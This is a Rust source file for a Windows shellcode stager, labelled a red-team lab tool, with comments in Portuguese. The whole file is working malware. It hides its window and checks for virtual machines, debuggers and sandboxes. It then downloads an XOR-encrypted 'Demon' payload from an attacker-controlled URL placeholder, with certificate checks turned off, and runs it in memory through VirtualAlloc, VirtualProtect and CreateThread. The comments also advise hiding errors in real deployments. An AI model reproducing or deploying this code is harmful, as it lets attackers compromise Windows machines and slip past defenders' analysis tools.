// ========================================================
// rusta-stager/src/main.rs
// Rust Stager v2.1 - Lab Red Team 2026 (Melhorado)
// ========================================================
#![windows_subsystem = "windows"]

use log::{error, info, warn};
use obfstr::obfstr;
use rand::Rng;
use reqwest::blocking;
use std::error::Error;
use std::time::Duration;
use sysinfo::System;
use windows::Win32::System::Diagnostics::Debug::{IsDebuggerPresent, CheckRemoteDebuggerPresent};
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;
use windows::Win32::Foundation::BOOL;

// ==================== CONFIG ====================
const XOR_KEY: &[u8] = b"LAB_REDTTEAM_2026_KEY_XOR";
const DEMON_URL: &str = "http://SEU_IP_AQUI:5000/get_demon"; // Mude para seu IP
// ================================================

fn main() -> Result<(), Box<dyn Error>> {
    env_logger::init();

    if !perform_security_checks() {
        // Sai de forma silenciosa (sem logs visíveis)
        std::process::exit(0);
    }

    if let Err(e) = execute_demon() {
        // Em produção real, não logar erro
        #[cfg(debug_assertions)]
        error!("{} Falha: {}", obfstr!("[!]"), e);
    }

    Ok(())
}

fn perform_security_checks() -> bool {
    let sys = System::new_all();

    // === 1. Checagens básicas de hardware ===
    if sys.cpus().len() < 4 {
        return false;
    }
    if sys.total_memory() < 8_000_000_000 {
        return false;
    }

    // === 2. Anti-VM: Verifica processos comuns de máquinas virtuais ===
    let vm_processes = [
        "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe",
        "vmwaretray.exe", "vmwareuser.exe", "prl_cc.exe", "prl_tools.exe"
    ];

    for process in sys.processes().values() {
        let name = process.name().to_lowercase();
        if vm_processes.iter().any(|&p| name.contains(p)) {
            warn!("{} Processo de VM detectado: {}", obfstr!("[!]"), name);
            return false;
        }
    }

    // === 3. Anti-Debug ===
    unsafe {
        if IsDebuggerPresent().as_bool() {
            return false;
        }

        let mut is_remote = BOOL(0);
        if CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut is_remote).is_ok() && is_remote.as_bool() {
            return false;
        }
    }

    // === 4. Anti-Sandbox: Resolução de tela baixa ===
    // (Muitos sandboxes usam resolução baixa)
    // Aqui você pode adicionar checagem de GetSystemMetrics se quiser

    // === 5. Delay com jitter (anti-timing) ===
    let base_delay = rand::thread_rng().gen_range(2500..6000);
    std::thread::sleep(Duration::from_millis(base_delay));

    true
}

fn execute_demon() -> Result<(), Box<dyn Error>> {
    info!("{} Baixando Demon...", obfstr!("[*]"));

    let client = blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(40))
        .build()?;

    let encrypted = client.get(DEMON_URL).send()?.bytes()?;
    let shellcode = decrypt_xor(&encrypted, XOR_KEY);

    if shellcode.len() < 128 {
        return Err("Shellcode muito pequeno ou inválido".into());
    }

    unsafe {
        // 1. Aloca memória como READWRITE (mais seguro que RWX direto)
        let addr = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if addr.is_null() {
            return Err("VirtualAlloc falhou".into());
        }

        // 2. Copia o shellcode para a memória alocada
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());

        // 3. Muda a proteção de RW → RX (Execute Read) — evita RWX
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        let result = VirtualProtect(
            addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if result.is_err() {
            return Err("VirtualProtect falhou".into());
        }

        // 4. Cria a thread apontando para o shellcode
        let start_routine: LPTHREAD_START_ROUTINE = Some(std::mem::transmute(addr));

        let thread_handle = CreateThread(
            None,
            0,
            start_routine,
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )?;

        info!("{} Shellcode executado na memória (RW → RX)!", obfstr!("[+]"));

        // Aguarda a thread (pode remover se quiser "fire and forget")
        WaitForSingleObject(thread_handle, INFINITE);
    }

    Ok(())
}
fn decrypt_xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .zip(key.iter().cycle())
        .map(|(&b, &k)| b ^ k)
        .collect()
}